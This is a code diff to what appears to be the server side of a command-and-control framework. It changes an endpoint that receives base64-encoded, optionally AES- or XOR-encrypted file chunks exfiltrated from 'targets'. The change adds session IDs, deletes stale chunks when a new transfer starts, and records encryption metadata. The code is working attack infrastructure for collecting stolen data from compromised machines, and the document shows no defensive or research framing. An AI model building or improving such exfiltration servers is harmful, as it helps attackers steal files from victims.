@@ -47,6 +47,7 @@ class ExfilChunkRequest(BaseModel):
     data_b64: str = ""
     encryption: str = "none"       # none | aes | xor
     encryption_meta: str = ""      # hex key, etc.
+    session_id: str = ""           # unique session identifier
 
 
 # ── Endpoints ─────────────────────────────────────────────────────────
@@ -171,10 +172,27 @@ def receive_exfil(
     if not target:
         raise HTTPException(status_code=404, detail="Unknown target")
 
+    # Generate session_id if not provided (for backward compatibility)
+    session_id = body.session_id or f"{body.filename}_{datetime.now(timezone.utc).timestamp()}"
+
+    # If this is the first chunk (index 0), clean up any previous chunks for this file
+    if body.chunk_index == 0:
+        # Delete previous exfil chunks for the same file
+        existing_chunks = session.exec(
+            select(Command).where(
+                Command.target_id == target_id,
+                Command.module_name == "exfil",
+                Command.command.contains(f"file={body.filename}")
+            )
+        ).all()
+        for chunk in existing_chunks:
+            session.delete(chunk)
+        session.flush()
+
     # Store as a command with module_name = "exfil" for easy retrieval
     meta = (
         f"file={body.filename} chunk={body.chunk_index}/{body.total_chunks} "
-        f"enc={body.encryption}"
+        f"enc={body.encryption} meta={body.encryption_meta} session={session_id}"
     )
     cmd = Command(
         target_id=target_id,
